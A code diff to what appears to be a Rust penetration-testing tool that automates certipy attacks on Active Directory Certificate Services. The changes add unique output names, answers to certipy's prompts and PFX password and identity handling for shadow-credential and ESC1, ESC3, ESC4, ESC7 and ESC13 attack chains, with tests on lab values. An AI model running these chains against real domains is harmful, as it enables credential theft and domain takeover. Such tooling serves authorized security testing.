@@ -28,12 +28,44 @@ fn render_chain_output(steps: &[(&str, &ToolOutput)]) -> (String, String) {
 /// Milliseconds since the Unix epoch, or 0 if the system clock predates it.
 /// Used to make certipy output filenames unique so certipy's interactive
 /// "Overwrite? (y/n)" prompt never fires and kills a non-interactive run.
-fn epoch_millis() -> u128 {
+pub(crate) fn epoch_millis() -> u128 {
     std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
         .map(|d| d.as_millis())
         .unwrap_or(0)
 }
+
+/// Monotonic counter behind [`unique_run_token`].
+static OUTPUT_SEQUENCE: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
+
+/// A token no two output paths in one operation can share.
+///
+/// A millisecond timestamp alone is not unique: `acquire_tool_permit` lets
+/// several exports run at once, and two writes against the same principal
+/// inside one millisecond then land on the same filename. The process id
+/// separates concurrent workers on a shared host and the counter separates
+/// calls inside one process, so the triple cannot repeat.
+///
+/// Contains no `_`, which is what lets a caller append an account name after it
+/// and split the two apart again.
+pub(crate) fn unique_run_token() -> String {
+    let seq = OUTPUT_SEQUENCE.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+    format!("{}-{}-{seq}", epoch_millis(), std::process::id())
+}
+
+/// Answers certipy feeds itself when it stops to ask.
+///
+/// `certipy/lib/files.py` prompts `File '<x>' already exists. Overwrite?` on
+/// every output it writes — the PFX from `req`/`shadow` and the ccache `auth`
+/// saves *before* it extracts the NT hash. Tool children run with a null stdin,
+/// so that prompt raises `EOFError` and the whole run dies after the attack has
+/// already succeeded on the wire. `y` overwrites in place, which keeps the
+/// output at the path the caller asked for; answering `n` would silently
+/// relocate it to a UUID-suffixed name the caller never learns.
+///
+/// The same answer clears `auth`'s identity confirmation, where only a literal
+/// `n` aborts.
+const CERTIPY_PROMPT_ANSWERS: &str = "y\ny\ny\ny\ny\n";
 
 /// Delete every `*.ccache` file in `dir`, or in the process's current working
 /// directory when `dir` is `None`.
@@ -174,11 +206,9 @@ pub fn build_certipy_request_command(args: &Value) -> Result<CommandBuilder> {
         .or_else(|| optional_str(args, "target_ip"));
     let application_policies = optional_str(args, "application_policies");
 
-    // Generate a unique output filename to avoid certipy's interactive overwrite
-    // prompt which kills non-interactive runs. Use template + epoch millis.
     let out = match optional_str(args, "out") {
         Some(o) => o.to_string(),
-        None => format!("cert_{template}_{}", epoch_millis()),
+        None => format!("cert_{template}_{}", unique_run_token()),
     };
 
     let user_at_domain = format!("{username}@{domain}");
@@ -194,6 +224,7 @@ pub fn build_certipy_request_command(args: &Value) -> Result<CommandBuilder> {
         .flag_opt("-upn", upn)
         .flag_opt("-sid", sid)
         .flag_opt("-application-policies", application_policies)
+        .stdin(CERTIPY_PROMPT_ANSWERS)
         .timeout_secs(120);
 
     if let Some(ccache) = ticket_path {
@@ -208,24 +239,55 @@ pub fn build_certipy_request_command(args: &Value) -> Result<CommandBuilder> {
 /// Authenticate with a PFX certificate using Certipy.
 ///
 /// Required args: `pfx_path`, `dc_ip`, `domain`
+/// Optional args: `pfx_password` (passphrase that opens the PFX)
+///
+/// A PFX exported by [`crate::acl::pywhisker`] is always encrypted, so stage
+/// two of a shadow-credential chain needs `certipy auth -password` or it dies
+/// on `Failed to load PFX file: Invalid password or PKCS12 data` with the key
+/// credential already planted. `certipy` gained `-password` on the `auth`
+/// subcommand in 5.0.0; the flag is emitted only when a passphrase actually
+/// applies, so `certipy req` output — unencrypted, and the input to every ADCS
+/// chain in this module — is invoked exactly as before.
+///
+/// That same PFX carries no SAN, and certipy reads identities from the SAN
+/// alone, so opening the file is still not enough: without `-username` the run
+/// ends on `Could not find identity in the provided certificate` followed by
+/// `Username or domain is not specified`. [`crate::acl::shadow_cred_pfx_identity`]
+/// supplies it, and only for a `pywhisker` export.
 pub async fn certipy_auth(args: &Value) -> Result<ToolOutput> {
-    let pfx_path = required_str(args, "pfx_path")?;
-    let dc_ip = required_str(args, "dc_ip")?;
-    let domain = required_str(args, "domain")?;
+    let cmd = build_certipy_auth(args)?;
 
     // Certipy auth writes .ccache based on cert subject (e.g. administrator.ccache)
     // and does NOT support -out. Remove existing .ccache files to prevent the
     // interactive "Overwrite? (y/n)" prompt that kills non-interactive runs.
     remove_ccache_files(None).await;
 
-    CommandBuilder::new("certipy")
+    cmd.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_certipy_auth(args: &Value) -> Result<CommandBuilder> {
+    let pfx_path = required_str(args, "pfx_path")?;
+    let dc_ip = required_str(args, "dc_ip")?;
+    let domain = required_str(args, "domain")?;
+
+    let mut cmd = CommandBuilder::new("certipy")
         .arg("auth")
         .flag_visible("-pfx", pfx_path)
         .flag("-dc-ip", dc_ip)
         .flag("-domain", domain)
-        .timeout_secs(120)
-        .execute()
-        .await
+        .stdin(CERTIPY_PROMPT_ANSWERS)
+        .timeout_secs(120);
+
+    if let Some(passphrase) = crate::acl::shadow_cred_pfx_password(args, pfx_path) {
+        cmd = cmd.flag("-password", passphrase);
+    }
+
+    if let Some(identity) = crate::acl::shadow_cred_pfx_identity(args, pfx_path) {
+        cmd = cmd.flag("-username", identity);
+    }
+
+    Ok(cmd)
 }
 
 /// Perform Certipy Shadow Credentials attack (auto mode).
@@ -258,10 +320,9 @@ pub fn build_certipy_shadow_command(args: &Value) -> Result<CommandBuilder> {
 
     let user_at_domain = format!("{username}@{domain}");
 
-    // Generate unique output name to avoid interactive overwrite prompt
     let out = match optional_str(args, "out") {
         Some(o) => o.to_string(),
-        None => format!("shadow_{target}_{}", epoch_millis()),
+        None => format!("shadow_{target}_{}", unique_run_token()),
     };
 
     let mut cmd = CommandBuilder::new("certipy")
@@ -271,6 +332,7 @@ pub fn build_certipy_shadow_command(args: &Value) -> Result<CommandBuilder> {
         .flag("-account", target)
         .flag("-dc-ip", dc_ip)
         .flag("-out", out)
+        .stdin(CERTIPY_PROMPT_ANSWERS)
         .timeout_secs(120);
 
     if let Some(ccache) = ticket_path {
@@ -367,7 +429,7 @@ pub async fn certipy_forge(args: &Value) -> Result<ToolOutput> {
         Some(o) => o.to_string(),
         None => {
             let safe_upn = upn.replace(['/', '\\', ' '], "_");
-            format!("forged_{safe_upn}_{}.pfx", epoch_millis())
+            format!("forged_{safe_upn}_{}.pfx", unique_run_token())
         }
     };
 
@@ -404,7 +466,7 @@ pub async fn certipy_retrieve(args: &Value) -> Result<ToolOutput> {
 
     let user_at_domain = format!("{username}@{domain}");
 
-    let ts = epoch_millis();
+    let ts = unique_run_token();
     let out = format!("cert_retrieve_{request_id}_{ts}");
 
     CommandBuilder::new("certipy")
@@ -462,7 +524,7 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
     let step1 = step1_cmd.timeout_secs(120).execute().await?;
     outputs.push(("Add Officer", step1));
 
-    let ts = epoch_millis();
+    let ts = unique_run_token();
     let out_name = format!("cert_esc7_{ts}");
 
     let mut req_cmd = CommandBuilder::new("certipy")
@@ -571,6 +633,7 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
         .flag_visible("-pfx", &pfx_path)
         .flag("-dc-ip", dc_ip)
         .flag("-domain", domain)
+        .stdin(CERTIPY_PROMPT_ANSWERS)
         .timeout_secs(120)
         .execute()
         .await?;
@@ -690,7 +753,7 @@ pub async fn certipy_esc4_full_chain(args: &Value) -> Result<ToolOutput> {
         .get("template")
         .and_then(|v| v.as_str())
         .unwrap_or("esc4");
-    let ts = epoch_millis();
+    let ts = unique_run_token();
     let out_name = format!("cert_{template}_{ts}");
     let pfx_path = format!("{out_name}.pfx");
 
@@ -783,7 +846,7 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
     let tempdir = tempfile::tempdir().context("failed to create tempdir for ESC3 chain")?;
     let cwd = tempdir.path().to_path_buf();
 
-    let ts = epoch_millis();
+    let ts = unique_run_token();
     let agent_out = format!("agent_{ts}");
     let agent_pfx = format!("{agent_out}.pfx");
     let target_out = format!("target_{ts}");
@@ -878,6 +941,7 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
         .flag("-dc-ip", dc_ip)
         .flag("-domain", domain)
         .current_dir(&cwd)
+        .stdin(CERTIPY_PROMPT_ANSWERS)
         .timeout_secs(180)
         .execute()
         .await?;
@@ -932,7 +996,7 @@ pub async fn certipy_esc13_full_chain(args: &Value) -> Result<ToolOutput> {
     let tempdir = tempfile::tempdir().context("failed to create tempdir for ESC13 chain")?;
     let cwd = tempdir.path().to_path_buf();
 
-    let ts = epoch_millis();
+    let ts = unique_run_token();
     let out_name = format!("esc13_{ts}");
     let pfx_name = format!("{out_name}.pfx");
 
@@ -977,6 +1041,7 @@ pub async fn certipy_esc13_full_chain(args: &Value) -> Result<ToolOutput> {
             .flag("-domain", domain)
             .flag("-username", username)
             .current_dir(&cwd)
+            .stdin(CERTIPY_PROMPT_ANSWERS)
             .timeout_secs(120)
             .execute()
             .await?;
@@ -1085,7 +1150,7 @@ pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
     let tempdir = tempfile::tempdir().context("failed to create tempdir for ESC1 chain")?;
     let cwd = tempdir.path().to_path_buf();
 
-    let ts = epoch_millis();
+    let ts = unique_run_token();
     let out_name = format!("esc1_{ts}");
     let pfx_name = format!("{out_name}.pfx");
 
@@ -1150,6 +1215,7 @@ pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
             .flag("-domain", domain)
             .flag("-username", auth_user)
             .current_dir(&cwd)
+            .stdin(CERTIPY_PROMPT_ANSWERS)
             .timeout_secs(120)
             .execute()
             .await?;
@@ -1549,6 +1615,177 @@ mod tests {
         assert_eq!(required_str(&args, "pfx_path").unwrap(), "/tmp/admin.pfx");
         assert_eq!(required_str(&args, "dc_ip").unwrap(), "192.168.58.10");
         assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
+    }
+
+    fn certipy_auth_flag(args: &serde_json::Value, flag: &str) -> Option<String> {
+        let cmd = super::build_certipy_auth(args).unwrap();
+        let argv = cmd.args_for_test();
+        let idx = argv.iter().position(|a| a == flag)?;
+        argv.get(idx + 1).cloned()
+    }
+
+    #[test]
+    fn certipy_auth_unlocks_a_pywhisker_pfx() {
+        let args = json!({
+            "pfx_path": SHADOW_CRED_PFX,
+            "dc_ip": "192.168.58.10",
+            "domain": "contoso.local"
+        });
+        assert_eq!(
+            certipy_auth_flag(&args, "-password").as_deref(),
+            Some(crate::acl::SHADOW_CRED_PFX_PASSPHRASE)
+        );
+    }
+
+    const SHADOW_CRED_PFX: &str = "/tmp/ares_shadowcred_1754000000000-4242-0_svc_sql.pfx";
+
+    #[test]
+    fn certipy_auth_names_the_identity_a_pywhisker_certificate_omits() {
+        let args = json!({
+            "pfx_path": SHADOW_CRED_PFX,
+            "dc_ip": "192.168.58.10",
+            "domain": "contoso.local"
+        });
+        assert_eq!(
+            certipy_auth_flag(&args, "-username").as_deref(),
+            Some("svc_sql"),
+            "pywhisker's self-signed certificate has no SAN, so certipy finds no \
+             identity in it and aborts before it ever reaches the KDC"
+        );
+        assert_eq!(
+            certipy_auth_flag(&args, "-domain").as_deref(),
+            Some("contoso.local"),
+            "certipy builds the PKINIT principal by joining -username and -domain"
+        );
+    }
+
+    #[test]
+    fn certipy_auth_carries_a_machine_account_marker_through() {
+        let args = json!({
+            "pfx_path": "/tmp/ares_shadowcred_1754000000000-4242-1_dc01$.pfx",
+            "dc_ip": "192.168.58.10",
+            "domain": "contoso.local"
+        });
+        assert_eq!(
+            certipy_auth_flag(&args, "-username").as_deref(),
+            Some("dc01$")
+        );
+    }
+
+    #[test]
+    fn certipy_auth_leaves_an_adcs_pfx_unchanged() {
+        let args = json!({
+            "pfx_path": "/tmp/cert_ESC1_1754000000000.pfx",
+            "dc_ip": "192.168.58.10",
+            "domain": "contoso.local",
+            "username": "alice"
+        });
+        assert!(certipy_auth_flag(&args, "-password").is_none());
+        let cmd = super::build_certipy_auth(&args).unwrap();
+        assert_eq!(
+            cmd.args_for_test(),
+            [
+                "auth",
+                "-pfx",
+                "/tmp/cert_ESC1_1754000000000.pfx",
+                "-dc-ip",
+                "192.168.58.10",
+                "-domain",
+                "contoso.local"
+            ],
+            "an ESC chain passes the enrolling account in `username`; sending it as \
+             -username would contradict the certificate's own UPN"
+        );
+    }
+
+    #[test]
+    fn every_certipy_builder_answers_the_overwrite_prompt() {
+        let auth = super::build_certipy_auth(&json!({
+            "pfx_path": SHADOW_CRED_PFX,
+            "dc_ip": "192.168.58.10",
+            "domain": "contoso.local"
+        }))
+        .unwrap();
+        let req = super::build_certipy_request_command(&json!({
+            "username": "alice",
+            "domain": "contoso.local",
+            "password": "P@ssw0rd!",
+            "ca": "contoso-CA01-CA",
+            "template": "User",
+            "dc_ip": "192.168.58.10"
+        }))
+        .unwrap();
+        let shadow = super::build_certipy_shadow_command(&json!({
+            "username": "alice",
+            "domain": "contoso.local",
+            "password": "P@ssw0rd!",
+            "target": "svc_sql",
+            "dc_ip": "192.168.58.10"
+        }))
+        .unwrap();
+        for cmd in [auth, req, shadow] {
+            assert_eq!(
+                cmd.stdin_for_test(),
+                Some(super::CERTIPY_PROMPT_ANSWERS),
+                "certipy prompts on every output whose name already exists, and a \
+                 tool child's stdin is null: the prompt raises EOFError and takes \
+                 the run down after the attack has already landed"
+            );
+        }
+    }
+
+    #[test]
+    fn certipy_output_names_cannot_repeat_inside_one_operation() {
+        let names: std::collections::HashSet<String> = (0..64)
+            .map(|_| {
+                let cmd = super::build_certipy_request_command(&json!({
+                    "username": "alice",
+                    "domain": "contoso.local",
+                    "password": "P@ssw0rd!",
+                    "ca": "contoso-CA01-CA",
+                    "template": "User",
+                    "dc_ip": "192.168.58.10"
+                }))
+                .unwrap();
+                let argv = cmd.args_for_test();
+                let idx = argv.iter().position(|a| a == "-out").unwrap();
+                argv[idx + 1].clone()
+            })
+            .collect();
+        assert_eq!(
+            names.len(),
+            64,
+            "a millisecond stamp alone repeats under load"
+        );
+    }
+
+    #[test]
+    fn certipy_auth_takes_an_explicit_pfx_password() {
+        let args = json!({
+            "pfx_path": "/tmp/operator_chosen.pfx",
+            "pfx_password": "OperatorChosen1!",
+            "dc_ip": "192.168.58.10",
+            "domain": "contoso.local"
+        });
+        assert_eq!(
+            certipy_auth_flag(&args, "-password").as_deref(),
+            Some("OperatorChosen1!")
+        );
+    }
+
+    #[test]
+    fn certipy_auth_keeps_the_pfx_path_readable_but_masks_the_passphrase() {
+        let args = json!({
+            "pfx_path": SHADOW_CRED_PFX,
+            "dc_ip": "192.168.58.10",
+            "domain": "contoso.local"
+        });
+        let line = super::build_certipy_auth(&args)
+            .unwrap()
+            .redacted_command_line();
+        assert!(line.contains(SHADOW_CRED_PFX));
+        assert!(line.contains("-username svc_sql"));
+        assert!(!line.contains(crate::acl::SHADOW_CRED_PFX_PASSPHRASE));
     }
 
     // --- certipy_shadow ---
